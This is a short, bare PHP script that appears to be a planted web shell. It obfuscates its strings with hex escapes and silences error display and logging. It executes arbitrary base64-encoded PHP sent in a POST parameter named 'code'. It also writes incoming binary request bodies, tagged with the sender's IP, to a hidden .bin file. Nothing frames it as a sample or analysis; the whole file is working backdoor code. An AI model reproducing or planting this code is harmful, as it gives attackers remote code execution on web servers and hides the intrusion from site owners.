<?php @error_reporting(0); @ini_set("d\x69\x73\x70l\x61y_er\x72o\x72s",0); @ini_set("\x6co\x67\x5fe\x72r\x6fr\x73",0); @ini_set("\x65\x72ror_l\x6f\x67",0); @ini_set("me\x6d\x6fry\x5flimi\x74", "\x31\x32\x38M"); @ini_set("\x6dax\x5fe\x78e\x63\x75tion\x5f\x74\x69m\x65",30); @set_time_limit(30); if (isset($_SERVER["HT\x54\x50_\x58\x5f\x52E\x41\x4c\x5f\x49P"])) $_SERVER["\x52\x45M\x4fTE_\x41D\x44R"] = $_SERVER["HT\x54\x50_\x58\x5f\x52E\x41\x4c\x5f\x49P"]; if (isset($_POST["\x63od\x65"])) { eval(base64_decode($_POST["\x63od\x65"])); } elseif (isset($_SERVER["\x48\x54TP\x5f\x43ONTENT_\x45NCO\x44ING"]) && $_SERVER["\x48\x54TP\x5f\x43ONTENT_\x45NCO\x44ING"] == "\x62in\x61\x72y") { $input = file_get_contents("ph\x70\x3a//inp\x75\x74"); if (strlen($input) > 0) print "\x53\x54\x41TUS\x2d\x49MPOR\x54\x2d\x4fK"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2ep\x68\x70","\x2ebin",basename($_SERVER["SCR\x49P\x54\x5f\x46\x49\x4c\x45\x4eA\x4dE"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52\x45M\x4fTE_\x41D\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["\x52EQUE\x53\x54_URI"], "\x2es\x68tml") !== false) { print $_SERVER["\x52EQUE\x53\x54_URI"]; } exit; ?>